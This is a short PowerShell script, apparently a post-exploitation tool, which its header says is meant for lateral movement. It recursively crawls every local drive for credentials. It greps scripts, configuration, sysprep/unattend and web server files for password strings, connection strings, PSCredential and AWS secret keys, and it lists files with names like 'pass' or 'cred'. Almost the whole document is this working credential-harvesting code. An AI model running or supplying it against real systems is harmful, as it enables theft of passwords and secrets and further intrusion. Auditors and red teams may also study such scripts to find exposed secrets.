####################
#
# Title   : HaystackBurn/HaystackBurn.ps1
# Author  : @Uncle-Fester-69
# Version : 1.0
#
# Used for lateral movement, Reduce the hay in the haystack to find more needles, faster.
# usual advisories apply, This is provided for free "as-is".. I take no responsibility for any adverse reactions on your host as a result of this script (high load, crash etc..).
#

Function Foldermapper { 
    param(
    [Parameter()]
    [string]$directory
    )
	
    ## Recurse all of the directories in a drive
	  #
    $directories = gci $directory -Directory -EA SilentlyContinue -Force | Where-Object { $_.Attributes -notmatch 'ReparsePoint' }
    foreach ($dir in $directories.FullName) 
    {
        # Optional, exclude some of the heavier directories with less chance of creds.
        if (($dir -notlike "C:\Windows\*") -and  ($dir -notlike "C:\Program Files*") -and ($dir -notlike "C:\ProgramData\Microsoft\*" ))
        {
            #Look for passwords in powershell scripts
            Get-ChildItem $dir\* -Include *.ps1 -EA SilentlyContinue | Select-String -pattern  "password:","password=","password>","password ","-password","ConvertTo-SecureString","PSCredential","Set-AWSCredentials","-SecretKey"

            #Configuration files containing password string
            Get-ChildItem $dir\* -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -EA SilentlyContinue | Select-String -Pattern "password:","password=","password>"

            #Find credentials in Sysprep or Unattend files
            Get-ChildItem $dir\* -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -EA SilentlyContinue | Select-String -Pattern "password:","password=","password>"

            #Find database credentials in configuration files
            Get-ChildItem $dir\* -Include *.config,*.conf,*.xml -EA SilentlyContinue | Select-String -Pattern "connectionString="

            #Locate web server configuration files
            Get-ChildItem $dir\* -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -EA SilentlyContinue | Select-String -Pattern "password:","password=","password>"

            #Some other interesting filetypes
            $FILES = Get-ChildItem $dir\* -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*pass*.xls,*cred*,*.sshCred*,*.config*,*accounts* -File -EA SilentlyContinue 
            echo $FILES.FullName

            #Have a small break between each directory to reduce overloading
            Start-Sleep -Seconds 0.5
            Foldermapper $dir
        }
    }
}


## Do an enumeration of each of the connected drives
#
$localdrives = Get-PSDrive -PSProvider 'FileSystem' | Where-Object {$_.DisplayRoot -notlike "\\*"}
foreach($Drive in $localdrives) {
	echo "Looking for Passwords in Powershell files in "$Drive.root
    Foldermapper $Drive.root
}
